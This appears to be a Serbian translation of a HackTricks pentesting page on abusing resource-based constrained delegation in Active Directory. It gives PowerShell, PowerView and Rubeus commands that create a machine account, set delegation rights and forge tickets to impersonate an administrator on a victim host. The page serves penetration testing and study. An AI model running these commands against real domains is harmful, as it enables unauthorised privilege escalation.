# Delegacija sa ograničenjima zasnovana na resursima

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Osnove delegacije sa ograničenjima zasnovane na resursima

Ovo je slično osnovnoj [Delegaciji sa ograničenjima](constrained-delegation.md) ali **umesto** davanja dozvola **objektu da se predstavlja kao bilo koji korisnik protiv servisa**. Delegacija sa ograničenjima zasnovana na resursima **postavlja u objektu ko može da se predstavlja kao bilo koji korisnik protiv njega**.

U ovom slučaju, ograničeni objekat će imati atribut nazvan _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ sa imenom korisnika koji može da se predstavlja kao bilo koji drugi korisnik protiv njega.

Još jedna važna razlika između ove Delegacije sa ograničenjima i drugih delegacija je da bilo koji korisnik sa **dozvolama za pisanje nad računom mašine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/itd_) može postaviti _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (U drugim oblicima Delegacije bili su vam potrebni privilegije domenskog administratora).

### Novi koncepti

U Delegaciji sa ograničenjima je rečeno da je potrebna zastava **`TrustedToAuthForDelegation`** unutar vrednosti _userAccountControl_ korisnika da bi se izvršio **S4U2Self**. Ali to nije potpuno tačno.\
Realnost je da čak i bez te vrednosti, možete izvršiti **S4U2Self** protiv bilo kog korisnika ako ste **servis** (imate SPN) ali, ako **imate `TrustedToAuthForDelegation`** vraćeni TGS će biti **Forwardable** i ako **nemate** tu zastavu vraćeni TGS **neće** biti **Forwardable**.

Međutim, ako **TGS** korišćen u **S4U2Proxy** nije **Forwardable** pokušaj zloupotrebe **osnovne Delegacije sa ograničenjima** **neće uspeti**. Ali ako pokušavate da iskoristite **Delegaciju sa ograničenjima zasnovanu na resursima, uspeće** (ovo nije ranjivost, već funkcionalnost, izgleda).

### Struktura napada

> Ako imate **privilegije ekvivalentne pisanju** nad **računom računara** možete dobiti **privilegovan pristup** na toj mašini.

Pretpostavimo da napadač već ima **privilegije ekvivalentne pisanju nad računarom žrtve**.

1. Napadač **kompromituje** nalog koji ima **SPN** ili **kreira jedan** ("Servis A"). Imajte na umu da **bilo** koji _Admin korisnik_ bez bilo kakvih drugih posebnih privilegija može **kreirati** do 10 **računarskih objekata (**_**MachineAccountQuota**_**)** i postaviti im SPN. Dakle, napadač može jednostavno kreirati računarski objekat i postaviti SPN.
2. Napadač **zloupotrebljava svoje privilegije ZA PISANJE** nad računarom žrtve (ServisB) da konfiguriše **delegaciju sa ograničenjima zasnovanu na resursima da dozvoli ServisuA da se predstavlja kao bilo koji korisnik** protiv tog računara žrtve (ServisB).
3. Napadač koristi Rubeus da izvrši **potpuni napad S4U** (S4U2Self i S4U2Proxy) od Servisa A do Servisa B za korisnika **sa privilegovanim pristupom Servisu B**.
1. S4U2Self (iz kompromitovanog/kreiranog naloga sa SPN-om): Traži **TGS Administratora meni** (Nije Forwardable).
2. S4U2Proxy: Koristi **ne Forwardable TGS** iz prethodnog koraka da zatraži **TGS** od **Administratora** do **računara žrtve**.
3. Čak i ako koristite ne Forwardable TGS, budući da iskorišćavate delegaciju sa ograničenjima zasnovanu na resursima, uspeće.
4. Napadač može **proći kartu** i **predstavljati se** kao korisnik da bi dobio **pristup ServisuB**.

Za proveru _**MachineAccountQuota**_ domena možete koristiti:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Napad

### Kreiranje objekta računara

Možete kreirati objekat računara unutar domena koristeći [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurisanje ograničene delegacije zasnovane na resursima

**Korišćenje activedirectory PowerShell modula**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Korišćenje powerview-a**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Izvođenje potpunog S4U napada

Prvo smo kreirali novi objekat računara sa šifrom `123456`, tako da nam je potreban heš te šifre:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Ovo će ispisati RC4 i AES heševe za taj nalog.\
Sada se može izvršiti napad:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Možete generisati više karata samo jednim zahtevom koristeći `/altservice` parametar Rubeusa:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Imajte na umu da korisnici imaju atribut nazvan "**Ne može biti delegiran**". Ako je ovaj atribut postavljen na True, nećete moći da se predstavite kao taj korisnik. Ova svojstva mogu se videti unutar Bloodhound-a.
{% endhint %}

### Pristupanje

Poslednja komanda će izvršiti **potpuni S4U napad i ubaciti TGS** od Administratora na ciljni host u **memoriju**.\
U ovom primeru je zatražen TGS za uslugu **CIFS** od Administratora, tako da ćete moći da pristupite **C$**:
```bash
ls \\victim.domain.local\C$
```
### Zloupotreba različitih servisnih karata

Saznajte o [**dostupnim servisnim kartama ovde**](silver-ticket.md#dostupne-usluge).

## Kerberos greške

* **`KDC_ERR_ETYPE_NOTSUPP`**: Ovo znači da je Kerberos konfigurisan da ne koristi DES ili RC4, a vi dostavljate samo RC4 heš. Dostavite Rubeusu barem AES256 heš (ili jednostavno dostavite rc4, aes128 i aes256 hešove). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Ovo znači da je vreme trenutnog računara različito od vremena DC-a i da Kerberos ne radi ispravno.
* **`preauth_failed`**: Ovo znači da dati korisničko ime + heševi ne funkcionišu za prijavljivanje. Možda ste zaboravili da stavite "$" unutar korisničkog imena prilikom generisanja heševa (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Ovo može značiti:
  * Korisnik kog pokušavate da imitirate ne može pristupiti željenoj usluzi (jer ne možete da ga imitirate ili nema dovoljno privilegija)
  * Tražena usluga ne postoji (ako tražite kartu za winrm, a winrm nije pokrenut)
  * Fake računar koji je kreiran je izgubio privilegije nad ranjivim serverom i morate ih vratiti.

## Reference

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite **zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
